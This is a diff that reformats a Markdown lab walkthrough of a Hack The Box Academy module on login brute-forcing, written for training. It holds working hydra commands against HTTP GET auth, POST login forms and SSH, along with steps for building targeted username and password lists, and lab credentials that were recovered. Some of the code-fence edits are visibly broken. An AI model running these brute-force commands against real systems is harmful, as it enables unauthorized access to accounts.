@@ -79,7 +79,7 @@ In this module, we dissect login brute-forcing and password spraying tradecraft 
 #### Technical Methodology & Exploit Execution:
 
 lets enter in the browser to the URL:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 We are requested to provide username and password, which we don't have.
@@ -99,10 +99,9 @@ And we will use the bruteforce tool 'hydra'.
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-hydra -C /usr/share/seclists/Passwords/Default-
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <target-IP> -s
+`<target-port>` http-get /
 ```
-Credentials/ftp-betterdefaultpasslist.txt <target-IP> -s
-<target-port> http-get /
 where the wordlist '/usr/../ftp-betterdefaultpasslist.txt' contains a pair of
 username and password, separated by ':':
 
@@ -139,9 +138,8 @@ username lists we will use 'names.txt', preinstalled in the pwnbox in the path
 
 and for the password lists 'rockyou', which we will download:
 ```bash
-wget https://github.com/brannondorsey/naive-
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 ```
-hashcat/releases/download/data/rockyou.txt
 
 
 *
@@ -160,9 +158,8 @@ hashcat/releases/download/data/rockyou.txt
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-hydra -l admin -P rockyou.txt -u -f <target-IP> -s <target-
+hydra -l admin -P rockyou.txt -u -f <target-IP> -s <target-port> http-get /
 ```
-port> http-get /
 in here we bruteforce the password for the already obtained 'admin'
 username:
 *:
@@ -189,8 +186,8 @@ Now for the second brute force – brute force for the username where we have
 the password 'admin':
 ```bash
 hydra -L /usr/share/seclists/Usernames/Names/names.txt -p
+admin -u -f `<target-IP>` -s `<target-port>` http-get /
 ```
-admin -u -f <target-IP> -s <target-port> http-get /
 
 
 
@@ -198,8 +195,8 @@ Now when those are done, lets bruteforce for the 'admin' in both username
 and password:
 ```bash
 hydra -L /usr/share/seclists/Usernames/Names/names.txt -P
+rockyou.txt -u -f `<target-IP>` -s `<target-port>` http-get /
 ```
-rockyou.txt -u -f <target-IP> -s <target-port> http-get /
 
 **note – due to the bruteforcing length of both username and password, I
 used the prior know of the credentials to 'manipulate' the rockyou.txt lise and
@@ -244,11 +241,10 @@ Now we are dealing with a POST request, with the parameters 'username' and
 'password'.
 We need to modify the hydra bruteforce command accordingly:
 ```bash
-hydra -l admin -P rockyou.txt -f <target-IP> -s <target-
-```
-port> http-post-form
+hydra -l admin -P rockyou.txt -f <target-IP> -s <target-port> http-post-form
 "/login.php:username=^USER^&password=^PASS^:F=<form
 name='login'"
+```
 we assume here the username is 'admin' as it is admin login panel. And we use
 the rockyou.txt wordlist (note – it is the original rockyou.txt, without any
 'manipulations' or 'modifications' that were committed on the previous
@@ -355,9 +351,8 @@ However, remembering the password policy from the previous section:
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-hydra -l b.gates -P william.txt -u -f ssh://<target-
+hydra -l b.gates -P william.txt -u -f ssh://<target-IP>:<target-port>
 ```
-IP>:<target-port>
 
 
 Credentials found! 'b.gates:4dn1l3M!$'
@@ -377,7 +372,7 @@ Credentials found! 'b.gates:4dn1l3M!$'
 
 #### Technical Methodology & Exploit Execution:
 
-./ssh_bruteforce.sh <target-IP> <target-port> b.gates
+./ssh_bruteforce.sh `<target-IP>` `<target-port>` b.gates
 william.txt
 
 
@@ -471,7 +466,7 @@ machine. but we do not care about that flag anymore. *
 #### Technical Methodology & Exploit Execution:
 
 lets access the target machine website:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 We are required to enter credentials.
@@ -493,10 +488,9 @@ We are dealing with a HTTP GET request.
 We will use the same dual username:password wordlist we used in the 'Default
 Passwords' section, including the '-C' flag:
 ```bash
-hydra -C /usr/share/seclists/Passwords/Default-
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <target-IP> -s
+`<target-port>` http-get /
 ```
-Credentials/ftp-betterdefaultpasslist.txt <target-IP> -s
-<target-port> http-get /
 
 
 The credentials are 'user:password' . Lets login:
@@ -534,10 +528,10 @@ We get to an admin panel. Lets see a login request in burpsuite:
 :
 ```bash
 hydra -l user -P rockyou.txt -f <target-IP> -s <target-port>
-```
 http-post-form
 "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-
 in'"
+```
 
 ![Figure 19.1 — Lab execution and output verification (Page 19)](/assets/images/posts/htb-academy/login-brute-forcing/p019_01.jpg)
 *_Figure 19.1 — Lab execution and output verification (Page 19)_*
@@ -579,12 +573,14 @@ personalized password list.
 
 Lets start with the username generation list.
 We will clone the tool:
-git clone https://github.com/urbanadventurer/username-
-anarchy.git
+```bash
+git clone https://github.com/urbanadventurer/username-anarchy.git
+```
 
 then generate the wordlist using the command:
-./username-anarchy/username-anarchy Harry Potter >
-hpotter.txt
+```bash
+./username-anarchy/username-anarchy Harry Potter > hpotter.txt
+```
 
 
 Username list 'hpotter.txt' is ready and contains 15 values.
@@ -644,9 +640,8 @@ sed -ri '/[0-9]+/!d' harry.txt;
 Now we have both the username list 'hpotter.txt' and the password list
 'harry.txt' ready. Lets bruteforce:
 ```bash
-hydra -L hpotter.txt -P harry.txt -u -f ssh://<target-
+hydra -L hpotter.txt -P harry.txt -u -f ssh://<target-IP>:<target-port>
 ```
-IP>:<target-port>
 
 ![Figure 23.1 — Lab execution and output verification (Page 23)](/assets/images/posts/htb-academy/login-brute-forcing/p023_01.jpg)
 *_Figure 23.1 — Lab execution and output verification (Page 23)_*
@@ -776,10 +771,9 @@ burpsuite:
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-hydra -l admin -P rockyou.txt -f <target-IP> -s <target-
-```
-port> http-post-form
+hydra -l admin -P rockyou.txt -f <target-IP> -s <target-port> http-post-form
 "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+```
 
 
 Credentials found! 'admin:zxcvbnm' . Lets login:
@@ -812,10 +806,10 @@ Username anarchy:
 First lets install the tool:
 ```bash
 sudo apt install ruby -y;
-```
 git clone https://github.com/urbanadventurer/username-
 anarchy.git;
 ```bash
+```
 cd username-anarchy;
 ```
 
@@ -841,9 +835,9 @@ The output was saved to 'jane_smith_usernames.txt'.
 
 CUPP:
 Now lets generate the password list, lets download cupp (if not installed):
-```bash
 sudo apt install cupp -y
 ```
+```bash
 
 
 *
@@ -918,10 +912,9 @@ requirements:
 
 
 ```bash
-grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-
-```
-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-
+grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-
 filtered.txt
+```
 
 
 
@@ -932,9 +925,9 @@ Now when we have the username list 'jane_smith_usernames.txt' and the
 password list 'jane-filtered.txt' - we are ready to bruteforce:
 ```bash
 hydra -L jane_smith_usernames.txt -P jane-filtered.txt
-```
-<target-IP> -s <target-port> -f http-post-form
+`<target-IP>` -s `<target-port>` -f http-post-form
 "/:username=^USER^&password=^PASS^:Invalid credentials"
+```
 
 
 We have a credentials! 'jane:3n4J!!'
